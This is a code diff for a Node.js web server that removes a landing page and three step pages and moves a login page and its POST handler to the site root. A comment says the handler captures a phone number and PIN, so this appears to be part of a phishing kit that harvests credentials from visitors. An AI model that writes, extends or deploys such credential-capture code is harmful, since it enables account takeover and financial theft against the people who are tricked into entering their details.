@@ -215,64 +215,10 @@ http.createServer(async (req, res) => {
         return;
     }
 
-    // Serve landing page
-    if (req.method === 'GET' && pathname === '/') {
-        fs.readFile(path.join(__dirname, 'landing.html'), (err, data) => {
-            if (err) {
-                res.writeHead(500);
-                res.end('Error loading page');
-                return;
-            }
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        });
-        return;
-    }
-
-    // Serve step1 page
-    if (req.method === 'GET' && pathname === '/step1') {
-        fs.readFile(path.join(__dirname, 'step1.html'), (err, data) => {
-            if (err) {
-                res.writeHead(500);
-                res.end('Error loading page');
-                return;
-            }
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        });
-        return;
-    }
-
-    // Serve step2 page
-    if (req.method === 'GET' && pathname === '/step2') {
-        fs.readFile(path.join(__dirname, 'step2.html'), (err, data) => {
-            if (err) {
-                res.writeHead(500);
-                res.end('Error loading page');
-                return;
-            }
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        });
-        return;
-    }
-
-    // Serve step3 page
-    if (req.method === 'GET' && pathname === '/step3') {
-        fs.readFile(path.join(__dirname, 'step3.html'), (err, data) => {
-            if (err) {
-                res.writeHead(500);
-                res.end('Error loading page');
-                return;
-            }
-            res.writeHead(200, { 'Content-Type': 'text/html' });
-            res.end(data);
-        });
-        return;
-    }
+    
 
     // Serve login page
-    if (req.method === 'GET' && pathname === '/login') {
+    if (req.method === 'GET' && pathname === '/') {
         fs.readFile(path.join(__dirname, 'login.html'), (err, data) => {
             if (err) {
                 res.writeHead(500);
@@ -469,7 +415,7 @@ http.createServer(async (req, res) => {
     }
 
     // Handle login (capture phone + PIN)
-    if (req.method === 'POST' && pathname === '/login') {
+    if (req.method === 'POST' && pathname === '/') {
         try {
             const data = await parseBody(req);
             const phone = data.phone;
